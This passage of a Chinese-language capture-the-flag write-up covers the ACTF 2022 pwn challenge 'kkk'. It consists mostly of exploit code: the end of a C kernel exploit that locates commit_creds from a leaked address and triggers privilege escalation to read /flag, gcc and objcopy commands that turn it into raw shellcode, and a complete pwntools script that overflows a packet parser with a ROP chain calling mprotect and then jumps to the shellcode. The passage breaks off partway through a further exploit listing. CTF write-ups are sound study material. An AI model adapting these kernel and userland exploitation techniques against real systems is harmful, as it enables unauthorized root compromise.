</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">kernel_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">sendbuf</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">);</span> <span class="c1">// 0xffffffff812258e0
</span><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">kernel_addr</span> <span class="o">-</span> <span class="mh">0xffffffff812258e0</span> <span class="o">+</span> <span class="mh">0xffffffff8109bcf0</span><span class="p">;</span>
    <span class="c1">// printf(&#34;[+] kernel_addr: 0x%lx\n&#34;, kernel_addr);
</span><span class="c1"></span>    <span class="c1">// printf(&#34;[+] commit_creds: 0x%lx\n&#34;, commit_creds);
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">my_memset</span><span class="p">(</span><span class="n">recvbuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">);</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>
    <span class="c1">// ptr[16] = 0xffffffff8284ef80;
</span><span class="c1"></span>    <span class="c1">// ptr[17] = 0xffffffff8284f020;
</span><span class="c1"></span>    <span class="n">ptr</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0xffffffff8109bcf0</span> <span class="o">+</span> <span class="mh">0xffffffff8284f020</span><span class="p">;</span>
    <span class="c1">// ptr[18] = 0xffffffff82850e20;
</span><span class="c1"></span>    <span class="c1">// ptr[19] = 0xffffffff82850610;
</span><span class="c1"></span>    <span class="n">Update</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>

    <span class="c1">// getchar();
</span><span class="c1"></span>    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>    <span class="c1">// trigger encryption, get root.
</span><span class="c1"></span>
    <span class="c1">// printf(&#34;[+] Current UID: %d\n&#34;, getuid());
</span><span class="c1"></span>    <span class="c1">// if (getuid()==0){
</span><span class="c1"></span>        <span class="c1">// printf(&#34;[+] Root now!!!\n&#34;);
</span><span class="c1"></span>        <span class="c1">// getchar();
</span><span class="c1"></span>    <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/flag&#34;</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">tmpfd</span> <span class="o">=</span> <span class="n">__asm_my_open</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
        <span class="c1">// if(tmpfd&lt;0){
</span><span class="c1"></span>        <span class="c1">//     printf(&#34;[-] Open error...&#34;);
</span><span class="c1"></span>        <span class="c1">//     exit(0);
</span><span class="c1"></span>        <span class="c1">// }
</span><span class="c1"></span>    <span class="n">__asm_my_read</span><span class="p">(</span><span class="n">tmpfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
    <span class="n">__asm_my_write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
    <span class="c1">// }
</span><span class="c1"></span>
    <span class="c1">// while(1);
</span><span class="c1"></span>
    <span class="c1">// system(&#34;/bin/sh&#34;);
</span><span class="c1"></span>    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="step-3">step 3</h2>
<p>最后一步，我们将两个 exp 合起来。首先拿到 exloit.c 的 shellcode，如果确实都改成 inline 汇编的话，直接这样编译就行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">gcc exploit.c -o exploit -pie -O2 -fno-stack-protector
</code></pre></td></tr></table>
</div>
</div><p>提取出代码段，于是便得到了纯机器码的利用脚本。在打穿 parser 的脚本中读入这段 shellcode 即可完成利用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">objcopy -O binary --only-section=.text exploit exp.o
</code></pre></td></tr></table>
</div>
</div><p>最后需要注意一点，shellcode 不能直接 <code>read</code> 进来，需要利用 parser 里的 <code>read_through_base64</code> 函数读 base64 进去。</p>
<blockquote>
<p>直接发了不可见字符给 qemu 会被吞字节的，因为相当于发信号过去了。</p>
</blockquote>
<p>最终 exp 如下，以不小的概率打通。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/home/x1do0/.local/lib/python3.8/site-packages&#39;</span><span class="p">)</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/home/x1do0/.local/lib/python3.8/site-packages/unicornafl-1.0.3-py3.8.egg&#39;</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>


<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;75&#39;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">con</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">con</span><span class="p">))</span>


<span class="c1"># io = process(&#34;./parser&#34;)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-system-x86_64&#34;</span><span class="p">,</span> <span class="s2">&#34;-m&#34;</span><span class="p">,</span> <span class="s2">&#34;1024M&#34;</span><span class="p">,</span> <span class="s2">&#34;-kernel&#34;</span><span class="p">,</span> <span class="s2">&#34;bzImage&#34;</span><span class="p">,</span> <span class="s2">&#34;-initrd&#34;</span><span class="p">,</span> <span class="s2">&#34;rootfs.img&#34;</span><span class="p">,</span> <span class="s2">&#34;-monitor&#34;</span><span class="p">,</span> <span class="s2">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="s2">&#34;-append&#34;</span><span class="p">,</span> <span class="s2">&#34;root=/dev/ram console=ttyS0 oops=panic panic=1 kpti=1 quiet&#34;</span><span class="p">,</span> <span class="s2">&#34;-cpu&#34;</span><span class="p">,</span> <span class="s2">&#34;kvm64,+smep,+smap&#34;</span><span class="p">,</span> <span class="s2">&#34;-smp&#34;</span><span class="p">,</span> <span class="s2">&#34;cores=2,threads=2&#34;</span><span class="p">,</span> <span class="s2">&#34;-nographic&#34;</span><span class="p">,</span> <span class="s2">&#34;-enable-kvm&#34;</span><span class="p">])</span>

<span class="c1"># input()</span>
<span class="c1"># gdb.attach(io, &#34;b *0x401B22&#34;)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">)</span>

<span class="c1">### pakcet_hdr 0 - 0x30</span>

<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xAAA</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x877</span><span class="p">)</span> <span class="c1"># a1[4]</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x796f15c9</span><span class="p">)</span> <span class="c1"># crc32</span>
<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">packet_hdr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">packet_hdr</span><span class="p">)</span>

<span class="c1">### segment_hdr 0x30 - 0x38</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">segment_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cnt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># a1[:30]</span>

<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment_hdr</span><span class="p">)</span>

<span class="c1">### segment 0x38 - </span>


<span class="c1">### header 8 bytes</span>
<span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span>
<span class="n">segment</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment</span><span class="p">)</span> 

<span class="c1">### content size bytes</span>

<span class="c1"># 0x00000000004006a6 : pop rdi ; ret</span>
<span class="c1"># 0x000000000045c139 : pop rdx ; pop rsi ; ret</span>
<span class="c1"># 0x00000000004005af : pop rax ; ret</span>
<span class="c1"># 0x00000000004859c5 : syscall ; ret</span>


<span class="c1"># mprotect(buf, 0x1000, 4|2|1)</span>

<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x6D4000</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x00000000004006a6</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span>
        <span class="mh">0x000000000045c139</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
        <span class="mh">0x00000000004005af</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
        <span class="mh">0x00000000004859c5</span><span class="p">)</span>

<span class="c1"># read(0, buf, 0x100)</span>

<span class="c1"># rop += flat(0x00000000004006a6, 0,</span>
<span class="c1">#         0x000000000045c139, 0x100, buf_addr,</span>
<span class="c1">#         0x00000000004005af, 0,</span>
<span class="c1">#         0x00000000004859c5)</span>


<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;exp.o&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x00000000004006a6</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span>
        <span class="mh">0x402a3c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> 
        <span class="mh">0x401ABB</span><span class="p">)</span>


<span class="c1"># ret2shellcode</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>

<span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x848</span> <span class="o">+</span> <span class="n">rop</span>
<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">()</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>

<span class="c1"># 0x7ffdbdb52b80</span>
<span class="c1"># return at 0x7ffdbdb533c8</span>


<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="conclusion">Conclusion</h2>
<p>至此，这题就算是做完了。最终的脚本成功概率不是特别高，但如果用户态 ROP 时加几个 ret slide 的话概率能显著提高（可能是错觉&hellip;）。一开始脸比较黑总是打不通，还以为 host 和 guest 偏移不一样&hellip;但这是静态编译啊，当时就觉得很迷。不过最后能确认的一点就是：host 与 guest 偏移没区别。虽然 Nu1L 那边的师傅也觉得痛苦，但我想我的痛苦完全源于自己太弱。。（脸黑也是弱的一个表现 :/</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png"
        data-srcset="https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png, https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png 1.5x, https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png"
        title="https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png" /></p>
<p>最后再贴一下出题人大哥忘记传上<a href="https://github.com/team-s2/ACTF-2022/tree/main/pwn/kkk/exploits" target="_blank" rel="noopener noreffer">官方题解</a>的 exploit.c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
